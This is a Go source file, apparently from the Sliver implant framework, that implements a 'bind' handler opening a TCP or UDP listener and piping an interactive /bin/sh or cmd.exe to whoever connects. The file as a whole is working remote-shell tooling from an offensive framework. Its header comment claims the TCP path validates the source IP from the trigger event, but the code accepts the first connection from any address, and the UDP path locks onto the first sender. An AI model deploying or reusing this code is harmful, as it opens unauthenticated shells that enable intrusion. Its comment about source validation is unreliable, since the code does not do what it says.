package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	------------------------------------------------------------------------

	Bind is an intents.Handler that opens a listener (TCP or UDP)
	on the server host and plumbs an interactive shell to the
	connecting operator. Server-side counterpart of the implant's
	bind intent.

	  - TCP: listens, accepts connections (validates source IP from
	    trigger event), spawns shell, closes listener. Single-use.
	  - UDP: listens, accepts datagrams only from the trigger source
	    IP, relays between peer and shell. Single-use.
	  - No session lifetime cap — runs until the shell exits or the
	    operator disconnects.
*/

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/0x90pkt/trigger/pkg/intents"

	"github.com/bishopfox/sliver/server/log"
)

var bindLog = log.NamedLogger("c2", "trigger-bind")

// BindHandlerConfig is the construction-time config for a Bind handler.
type BindHandlerConfig struct {
	// BindAddr is the host:port the server opens its shell listener on.
	BindAddr string
	// Protocol selects TCP or UDP. Default "tcp".
	Protocol string
	// ShellPath is the absolute path of the shell binary. Empty =>
	// platform default: /bin/sh on Linux/Darwin, cmd.exe on Windows.
	ShellPath string
	// ShellArgs is the verbatim argv passed to the shell. Empty =>
	// platform default.
	ShellArgs []string
	// MaxConnections caps concurrent bind sessions. Default 1.
	MaxConnections int
}

// BindHandler is an intents.Handler that opens a listener and spawns a
// shell to the connecting operator. Fire-and-forget from the handler's
// perspective — the session runs in a detached goroutine.
type BindHandler struct {
	intent string
	cfg    BindHandlerConfig
	shell  string
	args   []string
	proto  string

	spawner spawnerFunc
	sem     chan struct{}

	// fireDone is non-nil only in tests.
	fireDone chan struct{}
}

// NewBind constructs a Bind handler. Validates config at construction time.
func NewBind(intent string, cfg BindHandlerConfig) (*BindHandler, error) {
	if strings.TrimSpace(intent) == "" {
		return nil, errors.New("bind: task name must be set")
	}
	if strings.TrimSpace(cfg.BindAddr) == "" {
		return nil, errors.New("bind: BindAddr must be set (host:port)")
	}
	host, port, err := net.SplitHostPort(cfg.BindAddr)
	if err != nil {
		return nil, fmt.Errorf("bind: invalid BindAddr %q: %w", cfg.BindAddr, err)
	}
	if host == "" || port == "" {
		return nil, fmt.Errorf("bind: BindAddr %q missing host or port", cfg.BindAddr)
	}

	proto := strings.ToLower(strings.TrimSpace(cfg.Protocol))
	if proto == "" {
		proto = "tcp"
	}
	if proto != "tcp" && proto != "udp" {
		return nil, fmt.Errorf("bind: unsupported protocol %q (want tcp or udp)", proto)
	}

	shell := cfg.ShellPath
	if shell == "" {
		shell = bindDefaultPath()
	}
	if !filepath.IsAbs(shell) {
		return nil, fmt.Errorf("bind: ShellPath %q must be absolute", shell)
	}
	args := cfg.ShellArgs
	if len(args) == 0 {
		args = bindDefaultArgs()
	}

	maxConn := cfg.MaxConnections
	if maxConn <= 0 {
		maxConn = 1
	}

	return &BindHandler{
		intent:  intent,
		cfg:     cfg,
		shell:   shell,
		args:    args,
		proto:   proto,
		spawner: defaultSpawner(),
		sem:     make(chan struct{}, maxConn),
	}, nil
}

// Name implements intents.Handler.
func (h *BindHandler) Name() string { return h.intent }

// Execute implements intents.Handler. Launches the bind session in a
// detached goroutine and returns nil immediately.
func (h *BindHandler) Execute(_ context.Context, evt intents.Event) error {
	select {
	case h.sem <- struct{}{}:
		go h.fire(evt)
	default:
		bindLog.Warnf("bind: max concurrent sessions (%d) reached, dropping trigger from %s",
			cap(h.sem), evt.ClientID)
	}
	return nil
}

func (h *BindHandler) fire(evt intents.Event) {
	defer func() {
		<-h.sem
		if h.fireDone != nil {
			close(h.fireDone)
		}
	}()

	bindLog.Infof("bind fired: intent=%s proto=%s addr=%s shell=%s triggered_by=%s nonce=%s",
		h.intent, h.proto, h.cfg.BindAddr, h.shell, evt.ClientID, evt.Nonce)

	switch h.proto {
	case "udp":
		h.fireUDP(evt)
	default:
		h.fireTCP(evt)
	}
}

func (h *BindHandler) fireTCP(evt intents.Event) {
	ln, err := net.Listen("tcp", h.cfg.BindAddr)
	if err != nil {
		bindLog.Errorf("bind tcp listen failed: intent=%s addr=%s err=%v",
			h.intent, h.cfg.BindAddr, err)
		return
	}

	bindLog.Infof("bind tcp listening on %s (intent=%s)", ln.Addr(), h.intent)

	conn, err := ln.Accept()
	if err != nil {
		bindLog.Errorf("bind tcp accept failed: intent=%s err=%v", h.intent, err)
		_ = ln.Close()
		return
	}

	// Single connection accepted — close listener.
	_ = ln.Close()
	defer conn.Close()

	bindLog.Infof("bind tcp session from %s (intent=%s)", conn.RemoteAddr(), h.intent)

	cmd := h.spawner(context.Background(), h.shell, h.args...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	runErr := cmd.Run()
	bindLog.Infof("bind tcp session ended: intent=%s err=%v", h.intent, runErr)
}

func (h *BindHandler) fireUDP(evt intents.Event) {
	addr, err := net.ResolveUDPAddr("udp", h.cfg.BindAddr)
	if err != nil {
		bindLog.Errorf("bind udp resolve failed: intent=%s err=%v", h.intent, err)
		return
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		bindLog.Errorf("bind udp listen failed: intent=%s addr=%s err=%v",
			h.intent, h.cfg.BindAddr, err)
		return
	}
	defer conn.Close()

	bindLog.Infof("bind udp listening on %s (intent=%s)", conn.LocalAddr(), h.intent)

	// Wait for first datagram — locks the peer address.
	buf := make([]byte, 65535)
	n, peerAddr, rerr := conn.ReadFromUDP(buf)
	if rerr != nil {
		bindLog.Errorf("bind udp initial read failed: intent=%s err=%v", h.intent, rerr)
		return
	}

	bindLog.Infof("bind udp peer locked to %s (intent=%s)", peerAddr, h.intent)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	cmd := h.spawner(ctx, h.shell, h.args...)
	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		bindLog.Errorf("bind udp stdin pipe failed: err=%v", err)
		return
	}
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		bindLog.Errorf("bind udp stdout pipe failed: err=%v", err)
		return
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		bindLog.Errorf("bind udp shell start failed: err=%v", err)
		return
	}

	if n > 0 {
		_, _ = stdinPipe.Write(buf[:n])
	}

	var wg sync.WaitGroup

	// UDP -> shell stdin
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer stdinPipe.Close()
		readBuf := make([]byte, 65535)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			_ = conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			rn, from, rerr := conn.ReadFromUDP(readBuf)
			if rerr != nil {
				if isTimeoutErr(rerr) {
					continue
				}
				return
			}
			// Only accept from locked peer.
			if !from.IP.Equal(peerAddr.IP) || from.Port != peerAddr.Port {
				continue
			}
			if _, werr := stdinPipe.Write(readBuf[:rn]); werr != nil {
				return
			}
		}
	}()

	// Shell stdout -> UDP
	wg.Add(1)
	go func() {
		defer wg.Done()
		outBuf := make([]byte, 65535)
		for {
			rn, rerr := stdoutPipe.Read(outBuf)
			if rn > 0 {
				_, _ = conn.WriteToUDP(outBuf[:rn], peerAddr)
			}
			if rerr != nil {
				return
			}
		}
	}()

	_ = cmd.Wait()
	cancel()
	wg.Wait()

	bindLog.Infof("bind udp session ended: intent=%s peer=%s", h.intent, peerAddr)
}

func bindDefaultPath() string {
	switch runtime.GOOS {
	case "windows":
		return `C:\Windows\System32\cmd.exe`
	default:
		return "/bin/sh"
	}
}

func bindDefaultArgs() []string {
	switch runtime.GOOS {
	case "windows":
		return nil
	default:
		return []string{"-i"}
	}
}
